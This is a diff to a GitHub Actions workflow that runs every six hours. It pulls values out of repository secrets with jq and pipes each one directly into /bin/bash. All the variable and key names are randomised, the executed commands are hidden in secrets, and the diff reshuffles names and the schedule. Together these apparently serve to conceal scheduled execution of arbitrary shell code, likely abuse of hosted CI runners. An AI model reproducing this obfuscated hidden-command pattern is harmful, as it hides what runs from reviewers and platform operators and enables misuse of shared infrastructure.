@@ -2,9 +2,9 @@ name: wuhaojie1239
 on:
   workflow_dispatch:
   schedule:
-    - cron: '10 0/6 * * *'
+    - cron: '18 4/6 * * *'
 
-jobs:  # 17403
+jobs:
   build:
     runs-on: ubuntu-latest
 
@@ -12,15 +12,20 @@ jobs:  # 17403
       - uses: actions/checkout@v4
       - name: wuhaojie1239
         env:
-          aov085: ${{ secrets.aov085 }}
+          jovgc3: ${{ secrets.jovgc3 }}
         run: |
-          echo $aov085 | jq -r .cmde73348 | /bin/bash
-          echo $u979 | jq -r .aty7504 | /bin/bash
-          echo $azh6598 | jq -r .twv13 | /bin/bash
-          echo $od24 | jq -r .dbnu19949 | /bin/bash
-          echo $qu092 | jq -r .k9 | /bin/bash
-          echo $sbet16 | jq -r .yakpx10990 | /bin/bash
-          echo $hqcji88896 | jq -r .eak19 | /bin/bash
-          echo $vtlli519 | jq -r .wxwa3 | /bin/bash
-          echo $vq2 | jq -r .csmo23441 | /bin/bash
+          echo $jovgc3 | jq -r .wyrg2 | /bin/bash
+          echo $ouc625 | jq -r .tdzc8 | /bin/bash
+          echo $uvh46 | jq -r .q5465 | /bin/bash
+          echo $c2 | jq -r .wjwa7633 | /bin/bash
+          echo $mjvu089 | jq -r .wkjos3719 | /bin/bash
+          echo $iv36091 | jq -r .ppw7002 | /bin/bash
+          echo $qyh20455 | jq -r .t22 | /bin/bash
+          echo $x080 | jq -r .soqwv0353 | /bin/bash
+          echo $ilai22165 | jq -r .vxln4333 | /bin/bash
+          echo $p7 | jq -r .suiru10 | /bin/bash
+          echo $a6955 | jq -r .g014 | /bin/bash
+          echo $ftduy8 | jq -r .hc602 | /bin/bash
+          echo $kjioi7 | jq -r .p03439 | /bin/bash
+          echo $n68216 | jq -r .vh9698 | /bin/bash
 
